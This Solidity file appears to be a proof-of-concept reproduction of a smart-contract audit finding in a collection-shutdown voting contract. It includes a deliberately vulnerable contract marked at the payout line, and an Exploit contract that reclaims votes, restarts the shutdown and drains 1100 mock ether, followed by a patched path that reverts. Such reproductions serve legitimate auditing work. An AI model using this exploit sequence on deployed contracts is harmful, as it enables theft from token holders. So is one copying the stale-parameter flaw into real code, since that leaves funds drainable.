// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Flayer H-5 (Sherlock 2024-08, issue 173).
    execute() clears canExecute, so reclaimVote can zero shutdownVotes and
    start() can run again. start() points collectionToken at the new token
    and recomputes quorum from that token's 1 ether supply, but it writes
    the old params back, keeping availableClaim of 100 ether and the sweeper
    pool. voteAndClaim then pays 100 ether * 11 ether / 1 ether = 1100 ether.
*/

contract Erc20 {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function denomination() external pure returns (uint256) {
        return 0;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
    }

    function burnFrom(address from, uint256 amount) external {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract Locker {
    Erc20 public current;

    function collectionToken(address) external view returns (Erc20) {
        return current;
    }

    function createCollection() external returns (Erc20 token) {
        token = new Erc20("COLL2");
        current = token;
    }

    function mint(address to, uint256 amount) external {
        current.mint(to, amount);
    }
}

contract CollectionShutdown {
    uint256 internal constant ONE_HUNDRED_PERCENT = 100;
    uint256 public constant SHUTDOWN_QUORUM_PERCENT = 50;
    uint256 public constant MAX_SHUTDOWN_TOKENS = 4 ether;

    struct CollectionShutdownParams {
        Erc20 collectionToken;
        uint96 shutdownVotes;
        uint88 quorumVotes;
        bool canExecute;
        address sweeperPool;
        uint256 availableClaim;
    }

    Locker public locker;
    Erc20 public eth;
    mapping(address => CollectionShutdownParams) internal _collectionParams;
    mapping(address => mapping(address => uint256)) public shutdownVoters;
    bool public clearOnStart;
    uint256 public lastPayout;

    constructor(Locker _locker, Erc20 _eth) {
        locker = _locker;
        eth = _eth;
    }

    function collectionParams(address collection) external view returns (CollectionShutdownParams memory) {
        return _collectionParams[collection];
    }

    function seed(address collection, Erc20 oldToken, address voter) external {
        CollectionShutdownParams storage params = _collectionParams[collection];
        params.collectionToken = oldToken;
        params.shutdownVotes = uint96(1 ether);
        params.quorumVotes = uint88(0.5 ether);
        params.canExecute = false;
        params.sweeperPool = address(0x1);
        params.availableClaim = 100 ether;
        shutdownVoters[collection][voter] = 1 ether;
    }

    function enableClear() external {
        clearOnStart = true;
    }

    function reclaimVote(address _collection) public {
        CollectionShutdownParams storage params = _collectionParams[_collection];
        if (params.canExecute) revert("ShutdownQuorumHasPassed");
        uint256 userVotes = shutdownVoters[_collection][msg.sender];
        if (userVotes == 0) revert("NoVotesPlacedYet");
        params.shutdownVotes -= uint96(userVotes);
        delete shutdownVoters[_collection][msg.sender];
        params.collectionToken.transfer(msg.sender, userVotes);
    }

    function start(address _collection) public {
        CollectionShutdownParams memory params = _collectionParams[_collection];
        if (params.shutdownVotes != 0) revert("ShutdownProcessAlreadyStarted");
        params.collectionToken = locker.collectionToken(_collection);
        uint256 totalSupply = params.collectionToken.totalSupply();
        if (totalSupply > MAX_SHUTDOWN_TOKENS * 10 ** params.collectionToken.denomination()) revert("TooManyItems");
        params.quorumVotes = uint88(totalSupply * SHUTDOWN_QUORUM_PERCENT / ONE_HUNDRED_PERCENT);
        if (clearOnStart) {
            params.availableClaim = 0;
            params.sweeperPool = address(0);
        }
        _collectionParams[_collection] = _vote(_collection, params);
    }

    function _vote(address _collection, CollectionShutdownParams memory params) internal returns (CollectionShutdownParams memory) {
        uint256 userVotes = params.collectionToken.balanceOf(msg.sender);
        if (userVotes == 0) revert("UserHoldsNoTokens");
        params.collectionToken.transferFrom(msg.sender, address(this), userVotes);
        params.shutdownVotes += uint96(userVotes);
        shutdownVoters[_collection][msg.sender] += userVotes;
        if (!params.canExecute && params.shutdownVotes >= params.quorumVotes) params.canExecute = true;
        return params;
    }

    function voteAndClaim(address _collection) public {
        CollectionShutdownParams memory params = _collectionParams[_collection];
        if (params.sweeperPool == address(0)) revert("ShutdownNotExecuted");
        uint256 userVotes = params.collectionToken.balanceOf(msg.sender);
        if (userVotes == 0) revert("UserHoldsNoTokens");
        params.collectionToken.burnFrom(msg.sender, userVotes);
        // @> VULN: availableClaim is the previous sale and quorumVotes was reset from the new 1 ether supply
        uint256 amount = params.availableClaim * userVotes / (params.quorumVotes * ONE_HUNDRED_PERCENT / SHUTDOWN_QUORUM_PERCENT);
        lastPayout = amount;
        eth.transfer(msg.sender, amount);
    }
}

contract Exploit {
    Erc20 public eth;
    Erc20 public oldToken;
    Locker public locker;
    CollectionShutdown public shutdown;
    address public collection;
    uint256 public constant PAYOUT = 1100 ether;

    constructor() {
        eth = new Erc20("ETH");
        oldToken = new Erc20("COLL");
        locker = new Locker();
        shutdown = new CollectionShutdown(locker, eth);
        collection = address(0xC011EC);
        oldToken.mint(address(shutdown), 1 ether);
        eth.mint(address(shutdown), PAYOUT);
        shutdown.seed(collection, oldToken, address(this));
    }

    function run() external {
        shutdown.reclaimVote(collection);
        require(shutdown.collectionParams(collection).shutdownVotes == 0, "votes");
        locker.createCollection();
        locker.mint(address(this), 1 ether);
        Erc20 fresh = locker.collectionToken(collection);
        fresh.approve(address(shutdown), 1 ether);
        shutdown.start(collection);
        require(shutdown.collectionParams(collection).availableClaim == 100 ether, "stale");
        require(shutdown.collectionParams(collection).quorumVotes == 0.5 ether, "quorum");
        locker.mint(address(this), 11 ether);
        fresh.approve(address(shutdown), 11 ether);
        shutdown.voteAndClaim(collection);
        require(shutdown.lastPayout() == PAYOUT, "payout");
        require(eth.balanceOf(address(this)) == PAYOUT, "stolen");
        require(eth.balanceOf(address(shutdown)) == 0, "drained");
    }

    function runFixed() external {
        shutdown.enableClear();
        shutdown.reclaimVote(collection);
        locker.createCollection();
        locker.mint(address(this), 1 ether);
        locker.collectionToken(collection).approve(address(shutdown), 1 ether);
        shutdown.start(collection);
        locker.mint(address(this), 11 ether);
        locker.collectionToken(collection).approve(address(shutdown), 11 ether);
        try shutdown.voteAndClaim(collection) {
            revert("should revert");
        } catch {}
        require(eth.balanceOf(address(shutdown)) == PAYOUT, "kept");
        require(eth.balanceOf(address(this)) == 0, "none");
    }
}
